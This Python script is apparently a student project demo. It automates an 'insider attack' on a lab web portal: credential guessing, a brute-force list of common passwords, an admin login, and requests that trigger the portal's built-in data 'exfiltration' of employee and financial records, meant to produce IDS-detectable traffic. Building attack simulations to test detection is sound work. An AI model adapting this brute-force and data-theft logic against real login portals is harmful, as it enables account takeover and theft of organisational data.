#!/usr/bin/env python3
"""
FULL AUTOMATED INSIDER ATTACK - FYP DEMO
Scenario 2: Credential Theft + Data Exfiltration
"""

import requests
import time
import random
import os
import sys
from datetime import datetime

# ============================================================
# CONFIGURATION
# ============================================================

TARGET_IP = "192.168.50.120"
PORTAL_URL = f"http://{TARGET_IP}/attackportal/index.php"
DASHBOARD_URL = f"http://{TARGET_IP}/attackportal/dashboard.php"

# Valid test credentials
USERS = [
    ("admin", "admin123", "admin"),
    ("manager", "manager123", "manager"),
    ("staff1", "staff123", "staff"),
]

# Brute force payloads (mix of valid + invalid)
BRUTE_PAYLOADS = [
    ("admin", "admin123"),    # Valid
    ("admin", "password"),    # Invalid
    ("admin", "admin"),       # Invalid
    ("staff1", "staff123"),   # Valid
    ("staff1", "wrongpass"),  # Invalid
    ("manager", "manager123"),# Valid
    ("admin", "letmein"),     # Invalid
    ("admin", "123456"),      # Invalid
]

# ============================================================
# ATTACK CLASS
# ============================================================

class AttackAutomation:
    def __init__(self):
        self.session = requests.Session()
        self.results = {
            "credentials_stolen": [],
            "exfil_triggers": [],
            "total_records_stolen": 0
        }

    def print_banner(self):
        print("="*70)
        print("   FULL AUTOMATED INSIDER ATTACK")
        print("  FYP: Credential Theft + Data Exfiltration")
        print("="*70)
        print(f"  Target IP: {TARGET_IP}")
        print(f"  Portal: {PORTAL_URL}")
        print(f"  Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print("="*70)
        print("")

    # ------------------------------------------------------------
    # PHASE 1: CREDENTIAL THEFT
    # ------------------------------------------------------------
    def phase1_credential_theft(self):
        print("[*] PHASE 1: CREDENTIAL THEFT")
        print("-"*50)

        for user, password, role in USERS:
            print(f"    [+] Attempting: {user}/{password}")
            try:
                r = self.session.post(
                    PORTAL_URL,
                    data={"username": user, "password": password},
                    allow_redirects=False,
                    timeout=3
                )

                if r.status_code == 302:
                    print(f"     CREDENTIALS STOLEN: {user}:{password}")
                    self.results["credentials_stolen"].append({
                        "user": user,
                        "password": password,
                        "role": role,
                        "time": datetime.now().isoformat()
                    })
                else:
                    print(f"     Failed: {user}")
            except Exception as e:
                print(f"     Error: {e}")

            time.sleep(random.uniform(0.5, 1.0))

        print(f"\n[+] CREDENTIALS STOLEN: {len(self.results['credentials_stolen'])} accounts")
        return len(self.results['credentials_stolen']) > 0

    # ------------------------------------------------------------
    # PHASE 2: BRUTE FORCE SIMULATION
    # ------------------------------------------------------------
    def phase2_brute_force(self):
        print("\n[*] PHASE 2: BRUTE FORCE SIMULATION")
        print("-"*50)
        print("    [+] Generating login attempts for IDS detection...")

        for user, password in BRUTE_PAYLOADS[:8]:
            try:
                r = self.session.post(
                    PORTAL_URL,
                    data={"username": user, "password": password},
                    timeout=2
                )
                print(f"    [+] {user}:{password} -> {r.status_code}")
            except:
                print(f"     Failed: {user}:{password}")

            time.sleep(random.uniform(0.3, 0.8))

        print("[+] Brute force simulation complete")

    # ------------------------------------------------------------
    # PHASE 3: ADMIN LOGIN (Privilege Escalation)
    # ------------------------------------------------------------
    def phase3_admin_login(self):
        print("\n[*] PHASE 3: ADMIN LOGIN (Privilege Escalation)")
        print("-"*50)

        # Get admin credentials from stolen list, or use default
        admin_creds = [c for c in self.results["credentials_stolen"] if c["role"] == "admin"]

        if not admin_creds:
            print("    [!] No admin credentials found, using default")
            admin_creds = [{"user": "admin", "password": "admin123"}]

        self.session = requests.Session()

        for cred in admin_creds:
            user = cred["user"]
            password = cred["password"]
            print(f"    [+] Logging in as {user}...")

            try:
                r = self.session.post(
                    PORTAL_URL,
                    data={"username": user, "password": password},
                    allow_redirects=False,
                    timeout=3
                )

                if r.status_code == 302:
                    print(f"     LOGGED IN AS {user.upper()}!")
                    self.results["admin_session"] = True
                    return True
                else:
                    print(f"     Login failed for {user}")
            except Exception as e:
                print(f"     Error: {e}")

            time.sleep(1)

        return False

    # ------------------------------------------------------------
    # PHASE 4: DATA EXFILTRATION
    # ------------------------------------------------------------
    def phase4_data_exfil(self):
        print("\n[*] PHASE 4: DATA EXFILTRATION")
        print("-"*50)

        data_types = ["employees", "suppliers", "procurement", "financials", "all"]
        total_records = 0

        for data_type in data_types:
            print(f"    [+] Exfiltrating: {data_type}...")

            try:
                r = self.session.post(
                    DASHBOARD_URL,
                    data={"exfil": "1", "data_type": data_type},
                    timeout=5
                )

                if "successfully" in r.text.lower():
                    print(f"     {data_type} exfiltrated successfully!")
                    self.results["exfil_triggers"].append({
                        "type": data_type,
                        "time": datetime.now().isoformat()
                    })
                else:
                    print(f"     {data_type} may have failed")
            except Exception as e:
                print(f"     Error exfiltrating {data_type}: {e}")

            time.sleep(random.uniform(1.0, 2.0))

        # Count total records from exfil log
        try:
            with open('/var/www/html/attackportal/exfil.log', 'r') as f:
                lines = f.readlines()
                if lines:
                    last_line = lines[-1]
                    if "RECORDS:" in last_line:
                        records = last_line.split("RECORDS:")[1].split("|")[0].strip()
                        self.results["total_records_stolen"] = records
                        print(f"\n[+] TOTAL RECORDS STOLEN: {records}")
        except:
            pass

        return True

    # ------------------------------------------------------------
    # PHASE 5: NETWORK TRAFFIC GENERATION
    # ------------------------------------------------------------
    def phase5_network_traffic(self):
        print("\n[*] PHASE 5: NETWORK TRAFFIC GENERATION")
        print("-"*50)
        print("    [+] Generating traffic for IDS detection...")

        urls = [
            f"{PORTAL_URL}",
            f"{DASHBOARD_URL}",
            f"http://{TARGET_IP}/attackportal/",
            f"http://{TARGET_IP}/attackportal/employees.php",
            f"http://{TARGET_IP}/attackportal/suppliers.php",
            f"http://{TARGET_IP}/attackportal/procurement.php",
            f"http://{TARGET_IP}/attackportal/financials.php",
        ]

        for _ in range(10):
            url = random.choice(urls)
            try:
                r = self.session.get(url, timeout=2)
                print(f"    [+] GET {url} -> {r.status_code}")
            except:
                pass
            time.sleep(random.uniform(0.2, 0.6))

        print("[+] Network traffic generation complete")

    # ------------------------------------------------------------
    # SHOW RESULTS
    # ------------------------------------------------------------
    def show_results(self):
        print("\n" + "="*70)
        print("   ATTACK RESULTS")
        print("="*70)

        print("\n[+] CREDENTIALS STOLEN:")
        for cred in self.results["credentials_stolen"]:
            print(f"     {cred['user']}:{cred['password']} ({cred['role']})")

        print(f"\n[+] EXFIL TRIGGERS: {len(self.results['exfil_triggers'])}")
        for exfil in self.results["exfil_triggers"]:
            print(f"     {exfil['type']} at {exfil['time']}")

        print(f"\n[+] TOTAL RECORDS STOLEN: {self.results['total_records_stolen']}")

        print("\n[+] FILES GENERATED:")
        print("     /home/kali/stolen_creds.txt")
        print("     /var/www/html/attackportal/stolen.log")
        print("     /var/www/html/attackportal/exfil.log")
        print("     /home/kali/exfil_data_*.txt")

        print("\n" + "="*70)
        print("   ATTACK COMPLETE!")
        print(f"  Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print("="*70)

    # ------------------------------------------------------------
    # RUN FULL ATTACK
    # ------------------------------------------------------------
    def run(self):
        self.print_banner()

        # Phase 1: Steal credentials
        if not self.phase1_credential_theft():
            print("[!] No credentials stolen! Check portal.")
            return

        # Phase 2: Brute force simulation
        self.phase2_brute_force()

        # Phase 3: Admin login
        if not self.phase3_admin_login():
            print("[!] Could not login as admin!")
            return

        # Phase 4: Data exfiltration
        self.phase4_data_exfil()

        # Phase 5: Network traffic
        self.phase5_network_traffic()

        # Show results
        self.show_results()

        # Save results to file
        with open('/home/kali/attack_results.txt', 'w') as f:
            f.write(f"Attack Results: {datetime.now()}\n")
            f.write("="*50 + "\n")
            f.write(f"Credentials stolen: {len(self.results['credentials_stolen'])}\n")
            f.write(f"Exfil triggers: {len(self.results['exfil_triggers'])}\n")
            f.write(f"Records stolen: {self.results['total_records_stolen']}\n")


# ============================================================
# MAIN
# ============================================================

if __name__ == "__main__":
    attack = AttackAutomation()
    attack.run()
